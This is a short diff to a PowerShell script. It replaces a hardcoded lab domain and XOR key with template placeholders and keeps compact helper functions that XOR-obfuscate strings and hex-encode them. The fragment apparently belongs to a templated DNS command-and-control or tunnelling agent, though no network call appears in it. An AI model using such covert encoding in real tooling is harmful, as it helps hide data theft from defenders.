@@ -1,5 +1,5 @@
-$Z="lab.mydomain.net"
-$K=[byte[]]@(96,38,118,3)
+$Z="{{DOMAIN_ZONE}}"
+$K=[byte[]]@({{KEY_CSV}})
 function X($b){$o=New-Object byte[] $b.Length;for($i=0;$i-lt$b.Length;$i++){$o[$i]=$b[$i]-bxor$K[$i%4]};$o}
 function Enc($s){$b=X([text.encoding]::UTF8.GetBytes($s));-join($b|%{$_.ToString('x2')})}
 function Dec($h){if(!$h){return ""};$b=New-Object byte[]($h.Length/2);for($i=0;$i-lt$b.Length;$i++){$b[$i]=[convert]::ToByte($h.Substring($i*2,2),16)};[text.encoding]::UTF8.GetString((X $b))}
